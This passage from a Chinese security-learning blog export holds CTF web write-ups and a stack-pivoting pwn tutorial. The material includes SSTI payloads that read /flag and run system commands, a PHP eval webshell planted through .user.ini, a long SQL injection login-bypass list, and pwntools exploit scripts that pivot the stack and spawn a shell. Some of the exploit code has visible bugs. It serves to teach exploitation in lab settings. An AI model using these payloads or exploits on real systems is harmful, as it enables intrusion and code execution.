id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;欢迎: <span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>首先验证是否存在SSTI漏洞，使用简单的数学表达式测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:62433/?username=&#123;&#123;7*7&#125;&#125;&amp;password=test</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">阵法反馈</span><br><span class="line">Welcome: 49</span><br></pre></td></tr></table></figure>

<p>存在SSTI漏洞</p>
<p>Payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:62433/?username=&#123;&#123;().__class__.__base__.__subclasses__()[X].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/flag&#x27;).read()&#125;&#125;&amp;password=any</span><br></pre></td></tr></table></figure>



<h3 id="怎么多了个没用的php文件"><a href="#怎么多了个没用的php文件" class="headerlink" title="怎么多了个没用的php文件"></a>怎么多了个没用的php文件</h3><p>.user.ini 是 PHP 配置文件 php.ini 的补充文件。当通过 Web 服务器访问 PHP 页面时，PHP 会在当前执行的脚本所在目录及其上层目录中查找是否存在 .user.ini 文件。如果找到，便会将其中的配置指令合并到主 php.ini 设置中，并作为 CGI 或 FastCGI 进程的启动参数。</p>
<p>虽然 php.ini 限制了许多关键配置仅能在全局范围内修改，但 .user.ini 仍允许用户控制部分设置，其中之一便是 <code>auto_prepend_file</code> 指令。该指令用于指定一个文件，PHP 会在执行同一目录下的所有脚本之前自动包含该文件，使其成为脚本执行的预处理部分。</p>
<p>利用这一机制，攻击者可上传一个自定义的 .user.ini 文件，并通过设置 <code>auto_prepend_file</code> 指向某个包含恶意代码（如一句话木马）的文件。此后，只要访问该目录下的任何 PHP 脚本，都会自动加载该恶意文件，从而实现持久化的代码执行能力。为进一步完成攻击，攻击者通常还需上传一个包含恶意代码的预包含文件。</p>
<p>文件一</p>
<p>sh.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>文件二</p>
<p>.user.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file = sh.jpg</span><br></pre></td></tr></table></figure>

<p>用蚁剑连接即可</p>
<h3 id="看看ip"><a href="#看看ip" class="headerlink" title="看看ip"></a>看看ip</h3><p>抓包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?format=json HTTP/1.1</span><br><span class="line">Host: api.ipify.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://node6.anna.nssctf.cn:23286/</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:23286</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Priority: u=0</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>发现网站并没有用复杂的技术来获取IP，而是简单地让的浏览器去调用一个第三方IP查询API</p>
<p>如果服务器信任客户端传来的某些HTTP头信息，就可能被欺骗。最常用的头就是 <code>X-Forwarded-For</code> (XFF)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: node6.anna.nssctf.cn:23286</span><br><span class="line">X-Forwarded-For:&#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br><span class="line">Content-Length: 417</span><br><span class="line"></span><br><span class="line">ref(APA): piter.piterの小窝.https://npiter.tech. Retrieved 2025/9/21.</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>



<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include_once(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123;</span><br><span class="line">    if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;</span><br><span class="line">        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;</span><br><span class="line">            if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;yee&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;nop&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;go on&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;let&#x27;s get some php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; let&#x27;s get some php</span><br></pre></td></tr></table></figure>

<p>hackbar send post payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a[]=a&amp;b1[]=1&amp;b2[]=2&amp;c1=s878926199a&amp;c2=s155964671a</span><br></pre></td></tr></table></figure>









<h2 id="SQL之万能秘钥学习"><a href="#SQL之万能秘钥学习" class="headerlink" title="SQL之万能秘钥学习"></a>SQL之万能秘钥学习</h2><p>正常的SQL语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;输入的用户名&#x27; AND password = &#x27;输入的密码&#x27;;</span><br></pre></td></tr></table></figure>

<p>用户输入 <code>admin</code> 和 <code>123456</code>，生成的SQL语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;admin&#x27; AND password = &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>

<p>当我们输入     ‘ OR ‘1’&#x3D;’1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;随便输入什么都行&#x27; AND password = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure>

<p><code>username = &#39;随便输入什么都行&#39;</code> → False</p>
<p><code>password = &#39;123456&#39;</code> → False</p>
<p>(False AND False) OR True   —-&gt;    Ture</p>
<p>搬运<a href="%5B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E4%B8%8ESQL%E6%B3%A8%E5%85%A5-CSDN%E5%8D%9A%E5%AE%A2%5D(https://blog.csdn.net/hxhxhxhxx/article/details/108020010)">佬的blog</a></p>
<p>参考链接<a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">https://blog.csdn.net/hxhxhxhxx/article/details/108020010</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>asp aspx万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：”or “a”=”a</span><br><span class="line">2： ‘)or(‘a’=’a</span><br><span class="line">3：or 1=1–</span><br><span class="line">4：’or 1=1–</span><br><span class="line">5：a’or’ 1=1–</span><br><span class="line">6：”or 1=1–</span><br><span class="line">7：’or’a’=’a</span><br><span class="line">8：”or”=”a’=’a</span><br><span class="line">9：’or”=’</span><br><span class="line">10：’or’=’or’</span><br><span class="line">11: 1 or ‘1’=’1’=1</span><br><span class="line">12: 1 or ‘1’=’1’ or 1=1</span><br><span class="line">13: ‘OR 1=1%00</span><br><span class="line">14: “or 1=1%00</span><br><span class="line">15: ‘xor</span><br><span class="line">16: 用户名 ’ UNION Select 1,1,1 FROM admin Where ”=’ （替换表名admin）</span><br><span class="line">密码 1</span><br><span class="line">17…admin’ or ‘a’=’a 密码随便</span><br></pre></td></tr></table></figure>

<p>PHP万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘or 1=1/*</span><br><span class="line">User: something</span><br><span class="line">Pass: ’ OR ‘1’=’1</span><br></pre></td></tr></table></figure>

<p>jsp 万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1’or’1’=’1</span><br><span class="line">admin’ OR 1=1/*</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透学习</category>
      </categories>
  </entry>
  <entry>
    <title>栈迁移专题学习</title>
    <url>/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="栈迁移专题学习"><a href="#栈迁移专题学习" class="headerlink" title="栈迁移专题学习"></a>栈迁移专题学习</h2><p>📚 看了好几篇栈迁移的文章，🤔 越看越懵，😵‍💫 感觉自己和没学 pwn 的一样。</p>
<ul>
<li><a href="#%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0">原理学习</a><ul>
<li><a href="#32%E4%BD%8D">32位</a></li>
<li><a href="#64%E4%BD%8D">64位</a></li>
</ul>
</li>
<li><a href="#%E5%AE%9E%E4%BE%8B">实例</a><ul>
<li><a href="#32%E4%BD%8D">32位</a></li>
<li><a href="#64%E4%BD%8D">64位</a></li>
</ul>
</li>
</ul>
<h3 id="原理学习"><a href="#原理学习" class="headerlink" title="原理学习"></a>原理学习</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><ol>
<li>首先先了解栈的结构</li>
</ol>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84.png" alt="1"></p>
<p>(自己画的，有错误望指正)</p>
<ol start="2">
<li>了解栈的结构后，我们再来仔细了解一下leave;ret这两个指令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call func()</span><br><span class="line">-----------</span><br><span class="line">push eip + 4</span><br><span class="line">push ebp </span><br><span class="line">mov  ebp,esp</span><br></pre></td></tr></table></figure>

<p>   如果要保持栈平衡就要在call退出的时候执行相反的操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave</span><br><span class="line">----------</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">************</span><br><span class="line">ret</span><br><span class="line">------------</span><br><span class="line">pop eip</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>什么时候用栈迁移：</p>
<p>(1).有栈溢出漏洞。</p>
<p>(2).溢出的长度不够。</p>
<p>所以我们就要把栈迁移到一个长度够大的区域(通常是bss段)，那怎么把栈迁移呢，主要就是控制栈顶的esp指针指向我们想要他到达的地方(迁移后的地址)，从而控制程序的执行流。</p>
</li>
<li><p>栈迁移最重要就是怎么利用leave；ret进行栈迁移</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave //mov esp;ebp 把ebp传给esp,此时esp和ebp就在同一个位置了，他们指向同一个内容</span><br><span class="line">      //pop ebp 把栈顶的内容弹给ebp。此时ebp指向的就是栈顶的内容了</span><br><span class="line">由于esp时刻指向的是栈顶的位置，栈顶的内容弹出后，esp会下降一个单位</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBleave.png" alt="2"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ret  //pop eip 就是把esp指向地址弹如eip,同时esp下降一个单元</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBret.png" alt="3"></p>
<p>了解了栈的结构和leave;ret的执行过程后，就可以来了解栈迁移的原理了</p>
<ol start="5">
<li><p>栈迁移的原理：栈迁移一共要执行两次leave;ret</p>
<p>1.首先我们先了解一下此时栈上的分布情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主要如下图，这里注释：</span><br><span class="line">0xffff100c---&gt;system的返回地址</span><br><span class="line">0xffff1010---&gt;system参数的存储地址</span><br><span class="line">0xffff1014---&gt;存储/bin</span><br><span class="line">0xffff1018---&gt;存储/sh</span><br><span class="line">0xffff1020---&gt;0xffff1004  也就是ebp---&gt;0xffff1004</span><br><span class="line">0xffff1024---&gt;leave ret;  原本是return address;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/system%E5%88%86%E5%B8%83.png" alt="4"></p>
<p>2.第一次leave;ret:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由上面的leave;ret的执行过程，首先leave：mov ebp;esp,让ebp和esp在同一个位置；leave: pop ebp,此时我们把ebp所指的内容换成</span><br><span class="line">了需要迁移到的位置，所以pop ebp后esp指向的就是需要迁移到的位置。然后我们把return address换成leave ret的地址，就会再次执</span><br><span class="line">行leave ret。</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave1.png" alt="5"></p>
<p>3.第二次leave;ret:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同样是leave:mov ebp;esp,让ebp和esp在同一个位置；但是此时ebp指向的是需要迁移到的位置，所以esp此时指向的也是需要迁移到的位</span><br><span class="line">置;leave：pop ebp,我们把return address的地址换成system的地址,就使得esp下降一个单元后正好指向system的地址。ret:pop </span><br><span class="line">eip,最终eip指向system的地址---&gt;getshell</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave2.png" alt="5"></p>
</li>
</ol>
<p>了解完了32位的栈溢出，现在来了解64位栈溢出</p>
<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>64位和32位栈的结构是相似的，主要不同就是调用函数时传参的不同</p>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/64&&32%E4%BC%A0%E5%8F%82.png" alt="5"></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h4><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_2">buuctf-ciscn_2019_es_2</a></p>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.2.png" alt="6"></p>
<ol>
<li>IDA反编译</li>
</ol>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.0.png" alt="6"></p>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.1.png" alt="6"></p>
<p>计算一下溢出的长度0x30 - 0x28 &#x3D; 8;很明显长度不够，要用到栈迁移。</p>
<ol start="2">
<li>先给出exp，在具体解释</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29440</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./ciscn_s_4&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x8048400</span></span><br><span class="line">leave=<span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Welcome, my friend. What&#x27;</span>s your name?<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">r.send(payload)</span></span><br><span class="line"><span class="string">r.recvuntil(&#x27;</span>bbb<span class="string">b&#x27;)</span></span><br><span class="line"><span class="string">ebp=u32(p.recv(4).ljust(4,b&#x27;</span>\x00<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">buf=ebp-0x38 </span></span><br><span class="line"><span class="string">payload=(p32(sys_addr)+b&#x27;</span>aaaa<span class="string">&#x27;+p32(buf+12)+b&#x27;</span>/<span class="built_in">bin</span>/sh\x00<span class="string">&#x27;).ljust(0x28,b&#x27;</span>a<span class="string">&#x27;)+p32(buf-4)+p32(leave)</span></span><br><span class="line"><span class="string">r.send(payload) </span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>首先找到leave ret的地址可以用ROPgadget找，也可以直接在IDA的汇编代码里面找</li>
</ol>
<p>(1)用ROPgadget</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ciscn_2019_es_2 --only &quot;leave|ret&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.4.png" alt="8"></p>
<p>(2)在IDA的汇编代码里面找</p>
<p>​       <img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.5.png" alt="8"></p>
<ol start="4">
<li>找到system的plt地址</li>
</ol>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.6.png" alt="8"></p>
<ol start="5">
<li><p>在vul函数中有两个溢出点，所以我们就需要先通过第一个溢出泄露出ebp的地址，再构造栈迁移的payload</p>
<p>(1)首先泄露ebp的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node5.buuoj.cn&quot;, 25271)</span></span><br><span class="line">payload1= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> </span><br><span class="line">r.send(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>(2)构造栈迁移的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">buf=ebp-0x38 </span><br><span class="line">payload=(p32(sys_addr)+b&#x27;aaaa&#x27;+p32(buf+12)+b&#x27;/bin/sh\x00&#x27;).ljust(0x28,b&#x27;a&#x27;)+p32(buf-4)+p32(leave)</span><br></pre></td></tr></table></figure>

<p>buf&#x3D;ebp-0x38 通过调试可以得到，我们最后调试，先解释payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=(p32(sys_addr)+b&#x27;aaaa&#x27;+p32(buf+12)+b&#x27;/bin/sh\x00&#x27;).ljust(0x28,b&#x27;a&#x27;)+p32(buf)+p32(leave)</span><br><span class="line">---------------------------------------------------------------------------------------------------------------</span><br><span class="line">buf + 12:p32(sys_addr)=4,b&#x27;aaaa&#x27;=4,p32(buf+12)=4,4+4+4=12所以buf+12就是/bin/sh的起始地址</span><br><span class="line">p32(buf)：栈迁移所到达的位置</span><br><span class="line">leave:leave ret;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.7.png" alt="8"></p>
</li>
</ol>
<p>​       0xfffd158 - 0xfffd130 &#x3D; 0x28   0xfffd158回弹到0xfffd168，正好0x28 + 0x10 &#x3D; 0x38;</p>
<h4 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h4><p><a href="https://buuoj.cn/challenges#actf_2019_babystack">actf_2019_babystack</a></p>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.0.png" alt="9"></p>
<p> 64位，只开了NX,先给出exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#io =process(&#x27;./ACTF_2019_babystack&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26651</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./ACTF_2019_babystack&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4008F6</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your message will be saved at &#x27;</span>)</span><br><span class="line">stack_addr = io.recv(<span class="number">14</span>)</span><br><span class="line">stack_addr =<span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400ad3</span></span><br><span class="line">pop_rsi__r15_ret =<span class="number">0x400ad1</span></span><br><span class="line">leave_ret = <span class="number">0x400A18</span></span><br><span class="line">offest = <span class="number">0xd0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">payload =payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">system_addr = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your message will be saved at &#x27;</span>)</span><br><span class="line">stack_addr = io.recv(<span class="number">14</span>)</span><br><span class="line">stack_addr =<span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(leave_ret+<span class="number">1</span>)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)</span><br><span class="line">payload =payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.1.png" alt="9"></p>
<p>这个很明显要栈迁移了</p>
<p>这个附件里面没有找到system的地址，所以我们只能通过泄露libc来打了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr) #ret2libc的payload</span><br><span class="line">payload =payload.ljust(0xd0,b&#x27;a&#x27;) #填充垃圾数据</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret) #stack_addr就是栈的起始位置，也就是我要迁移到的位置，本题直接回打印出来，接受就可以了</span><br><span class="line">b&#x27;a&#x27;*8是因为pop rbp的时候 rsp会+8，所以要。</span><br></pre></td></tr></table></figure>

